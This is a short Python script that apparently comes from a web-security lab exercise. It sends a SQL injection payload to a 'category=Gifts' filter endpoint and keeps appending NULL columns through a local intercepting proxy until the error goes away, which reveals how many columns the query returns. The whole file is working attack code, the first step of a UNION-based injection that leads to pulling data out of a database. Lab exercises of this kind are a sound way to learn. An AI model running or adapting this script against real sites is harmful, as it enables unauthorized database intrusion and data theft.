import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli(url,payload):
    uri = "/filter?category=Gifts'"
    i = 1
    while(True):
        if i!=1:
            payload = payload + ", NULL"
        else:
            payload = payload + " NULL"    
        pay2 = payload + " --"
        r = requests.get(url+uri+pay2, verify = False, proxies=proxies)
        if "Error" in r.text:
            i = i+1
        else:
            break
    return i

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("Usage %s <url> <payload>"% sys.argv[0])
        print("Example %s www.example.com ' 1=1--'" % sys.argv[0])
        sys.exit(-1)

    no_of_columns =  exploit_sqli(url,payload)
    print("No of columns = %i"% no_of_columns)